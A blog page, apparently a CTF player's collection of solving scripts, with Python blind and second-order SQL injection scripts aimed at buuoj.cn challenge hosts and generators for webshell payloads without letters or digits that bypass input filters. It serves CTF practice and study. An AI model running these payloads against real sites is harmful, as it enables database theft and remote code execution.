@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="将伪随机数转换成php_mt_seed可以识别的数据格式12345678910111213import requestsimport randomdict1=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;dict2=&apos;KVQP0LdJKRaV3n9D&apos;dict3 = dict1[::-1]     length =">
+<meta name="keywords" content="CTF,总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-解题脚本集合">
+<meta property="og:url" content="https://fanygit.github.io/2021/11/09/CTF-解题脚本集合/index.html">
+<meta property="og:site_name" content="Fan的小酒馆">
+<meta property="og:description" content="将伪随机数转换成php_mt_seed可以识别的数据格式12345678910111213import requestsimport randomdict1=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;dict2=&apos;KVQP0LdJKRaV3n9D&apos;dict3 = dict1[::-1]     length =">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-11-18T13:21:14.690Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF-解题脚本集合">
+<meta name="twitter:description" content="将伪随机数转换成php_mt_seed可以识别的数据格式12345678910111213import requestsimport randomdict1=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;dict2=&apos;KVQP0LdJKRaV3n9D&apos;dict3 = dict1[::-1]     length =">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://fanygit.github.io/2021/11/09/CTF-解题脚本集合/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>CTF-解题脚本集合 | Fan的小酒馆</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Fan的小酒馆</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-playlist">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/playlist/" rel="section"><i class="menu-item-icon fa fa-fw fa-music"></i> <br>歌单</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fanygit.github.io/2021/11/09/CTF-解题脚本集合/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Fany">
+      <meta itemprop="description" content="千里之行，始于足下。">
+      <meta itemprop="image" content="/images/tx5.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fan的小酒馆">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF-解题脚本集合
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-11-09 15:48:00" itemprop="dateCreated datePublished" datetime="2021-11-09T15:48:00+08:00">2021-11-09</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2021-11-18 21:21:14" itemprop="dateModified" datetime="2021-11-18T21:21:14+08:00">2021-11-18</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/CTF做题姿势总结/" itemprop="url" rel="index"><span itemprop="name">CTF做题姿势总结</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          
+            
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="fa fa-comment-o"></i>
+    </span>
+    
+      <span class="post-meta-item-text">评论数：</span>
+    
+  
+    <a href="/2021/11/09/CTF-解题脚本集合/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/11/09/CTF-解题脚本集合/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="将伪随机数转换成php-mt-seed可以识别的数据格式"><a href="#将伪随机数转换成php-mt-seed可以识别的数据格式" class="headerlink" title="将伪随机数转换成php_mt_seed可以识别的数据格式"></a>将伪随机数转换成php_mt_seed可以识别的数据格式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">dict1=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">dict2=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">dict3 = dict1[::<span class="number">-1</span>]     </span><br><span class="line">length = len(dict2)    </span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dict2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(dict1)):</span><br><span class="line">        <span class="keyword">if</span> dict2[i] == dict1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(dict1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL盲注脚本"><a href="#SQL盲注脚本" class="headerlink" title="SQL盲注脚本"></a>SQL盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://bdeb176a-4425-4fe9-997e-02afb5312134.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    a = <span class="number">32</span></span><br><span class="line">    b = <span class="number">128</span></span><br><span class="line">    mid = (a+b)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(a&lt;b):</span><br><span class="line">        </span><br><span class="line">         <span class="comment">#stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)   爆表名</span></span><br><span class="line">         </span><br><span class="line">         <span class="comment">#stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))&gt;0)  爆列名</span></span><br><span class="line">        print(mid)</span><br><span class="line">        payload = url+<span class="string">"?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)"</span>%(i,mid)</span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        re = requests.get(url=payload)</span><br><span class="line">        <span class="comment"># 首先判断目标值 是否小于 </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            a = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 目标值 大于 则直接 将 mid 赋值给 b</span></span><br><span class="line">            b = mid</span><br><span class="line">        mid = (a+b)//<span class="number">2</span></span><br><span class="line">    <span class="comment"># 这个二分查找的方式是 完整的走完一遍，也就是跑7次 </span></span><br><span class="line">    <span class="keyword">if</span> (mid==<span class="number">32</span>|mid==<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    flag +=chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注二次注入"><a href="#盲注二次注入" class="headerlink" title="盲注二次注入"></a>盲注二次注入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">flag_hex = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># email=a9%40qq.com&amp;username='%2bsubstr((hex(hex((select * from flag))))from 1 for 10)%2b'&amp;password=1</span></span><br><span class="line">url_reg = <span class="string">"http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/register.php"</span></span><br><span class="line">url_login = <span class="string">"http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/login.php"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    reg_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>: <span class="string">'b%d@qq.com'</span>%(i),</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">"'+substr((hex(hex((select * from flag))))from %d for 10)+'"</span>%(i*<span class="number">10</span>+<span class="number">1</span>),</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url=url_reg, data=reg_data)</span><br><span class="line"></span><br><span class="line">    data_login = &#123;</span><br><span class="line">        <span class="string">'email'</span>: <span class="string">'b%d@qq.com'</span>%(i),</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url_login, data=data_login)</span><br><span class="line">    res = re.findall(<span class="string">r'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;'</span>, res.text,re.S)[<span class="number">0</span>].strip()</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag_hex +=res</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">print(flag_hex)</span><br></pre></td></tr></table></figure>
+
+<h4 id="无字母数字webshell-异或绕过构建脚本"><a href="#无字母数字webshell-异或绕过构建脚本" class="headerlink" title="无字母数字webshell-异或绕过构建脚本"></a>无字母数字webshell-异或绕过构建脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'a'</span>,<span class="string">'q'</span>,<span class="string">'u'</span>,<span class="string">'_'</span>,<span class="string">'i'</span>,<span class="string">'s'</span>,<span class="string">'c'</span>,<span class="string">'t'</span>,<span class="string">'e'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br><span class="line">            <span class="comment"># $&#123;%FF%FF%FF^%B8%BA%AB&#125;&#123;%FF^%A0&#125;();</span></span><br><span class="line">            <span class="comment"># aqua_is_cute</span></span><br><span class="line">            <span class="comment"># %FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF^%9E%8E%8A%9E%A0%96%8C%A0%9C%8A%8B%9A</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$l = <span class="string">""</span>;</span><br><span class="line">$r = <span class="string">""</span>;</span><br><span class="line">$argv = str_split(<span class="string">"_POST"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($argv); $i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">255</span>; $j++) &#123;</span><br><span class="line">        $k = chr($j) ^ chr(<span class="number">255</span>); <span class="comment">// dechex(255) = ff</span></span><br><span class="line">        <span class="keyword">if</span> ($k == $argv[$i]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($j &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                $l .= <span class="string">"%ff"</span>;</span><br><span class="line">                $r .= <span class="string">"%0"</span> . dechex($j);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $l .= <span class="string">"%ff"</span>;</span><br><span class="line">            $r .= <span class="string">"%"</span> . dechex($j);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\&#123;$l`$r\&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="无字母数字webshell构造"><a href="#无字母数字webshell构造" class="headerlink" title="无字母数字webshell构造"></a>无字母数字webshell构造</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">$str = <span class="string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mb_strlen($str, <span class="string">'utf-8'</span>); $i++)</span><br><span class="line">&#123;</span><br><span class="line">    $st = mb_substr($str, $i,<span class="number">1</span>, <span class="string">'utf-8'</span>);</span><br><span class="line">    $a = ~($st);</span><br><span class="line">    $b = $a[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">    <span class="keyword">if</span>($b==$_GET[<span class="string">'a'</span>])		<span class="comment">#$_GET['a']想要得到的字符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $st;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用法</span></span><br><span class="line"><span class="comment">//$_=~('北')[1]</span></span><br><span class="line"><span class="comment">//#s</span></span><br><span class="line"><span 